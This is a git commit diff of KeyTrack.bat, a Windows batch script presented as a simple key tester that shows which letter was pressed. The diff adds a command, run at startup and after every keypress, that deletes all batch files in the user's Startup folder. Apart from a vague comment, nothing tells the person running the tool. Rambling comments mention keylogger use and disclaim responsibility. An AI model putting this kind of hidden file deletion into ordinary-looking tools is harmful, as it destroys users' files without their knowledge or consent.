bd53422f4ec3c1ced84778ef4471d483e4869bb8
MatAttxck <86919403+MatAttxck@users.noreply.github.com>
2022-01-03 17:35:26 -0500

    Update KeyTrack.bat
    Auto delete any batch files in Start Up Folder + Changes

--- KeyTrack.bat
+++ KeyTrack.bat
@@ -1,11 +1,29 @@
+REM :: WARNING
+REM :: IF YOU ARE GOING TO USE THIS HAS A KEY LOGGER IM NOT GONNA BE THE PERSON BLAMED FOR IT.
+REM :: I JUST MADE THIS TO JUST TEST TO SEE YOUR KEYS TO WORK, I AM NOT ABLE TO TRACK ANY PASSWORDS, EMAILS, ETC.
+REM :: IT IS JUST NOT POSSABLE TO DO UNLESS IF SERVER WAS HERE TO LOG YOUR KEY PRESSES. IF YOU USE THIS AND REMOVE THE DEL COMMAND FILES
+REM :: YOU ARE MODFIYING THE FILES WHICH I GIVE YOU PERMS TO DO, BUT DO ANYTHING ILLEGAL WITH IT.
+REM :: Goodbye and Stay Safe out there :D
+REM :: This app has access to your startup folder also.
 @echo off
-title Letter Tracker
+setlocal EnableDelayedExpansion
+:: Makes the cool text :D
+chcp 65001 >nul 
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
+title Key Typer
 goto press
 :press
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
-echo Press a Letter Key!
+echo.
+echo  _  _  ____  _  _    ____  _  _  ____  ____  ____ 
+echo ( )/ )( ___)( \/ )  (_  _)( \/ )(  _ \( ___)(  _ \
+echo (   (  )__)  \  /     )(   \  /  )___/ )__)  )   /
+echo (_)\_)(____) (__)    (__)  (__) (__)  (____)(_)\_)
+echo.                                                                                                                                                             
+echo [ Press a Letter Key! ]
+echo.
 choice /c ABCDEFGHIJKLMNOPQRSTUVWXYZ >nul
-choice /c abcdefghijklmnopqrstuvwxyz >nul
 if %errorlevel% equ 1 goto 1
 if %errorlevel% equ 2 goto 2
 if %errorlevel% equ 3 goto 3
@@ -34,132 +52,166 @@ if %errorlevel% equ 25 goto 25
 if %errorlevel% equ 26 goto 26
 
 :1
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed A
 pause
 goto press
 :2
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed B
 pause
 goto press
 :3
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed C
 pause
 goto press
 :4
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed D
 pause
 goto press
 :5
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed E
 pause
 goto press
 :6
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed F
 pause
 goto press
 :7
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed G
 pause
 goto press
 :8
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed H
 pause
 goto press
 :9
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed I
 pause
 goto press
 :10
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed J
 pause
 goto press
 :11
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed K
 pause
 goto press
 :12
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed L
 pause
 goto press
 :13
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed M
 pause
 goto press
 :14
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed N
 pause
 goto press
 :15
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed O
 pause
 goto press
 :16
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed P
 pause
 goto press
 :17
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed Q
 pause
 goto press
 :18
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed R
 pause
 goto press
 :19
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed S
 pause
 goto press
 :20
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed T
 pause
 goto press
 :21
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed U
 pause
 goto press
 :22
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed V
 pause
 goto press
 :23
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed W
 pause
 goto press
 :24
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed X
 pause
 goto press
 :25
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed Y
 pause
 goto press
 :26
+DEL "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"
 cls
 echo You pressed Z
 pause
 goto press
+
+REM :: WARNING
+REM :: IF YOU ARE GOING TO USE THIS HAS A KEY LOGGER IM NOT GONNA BE THE PERSON BLAMED FOR IT.
+REM :: I JUST MADE THIS TO JUST TEST TO SEE YOUR KEYS TO WORK, I AM NOT ABLE TO TRACK ANY PASSWORDS, EMAILS, ETC.
+REM :: IT IS JUST NOT POSSABLE TO DO UNLESS IF SERVER WAS HERE TO LOG YOUR KEY PRESSES. IF YOU USE THIS AND REMOVE THE DEL COMMAND FILES
+REM :: YOU ARE MODFIYING THE FILES WHICH I GIVE YOU PERMS TO DO, BUT DO ANYTHING ILLEGAL WITH IT.
+REM :: Goodbye and Stay Safe out there :D
+REM :: This app has access to your startup folder also.
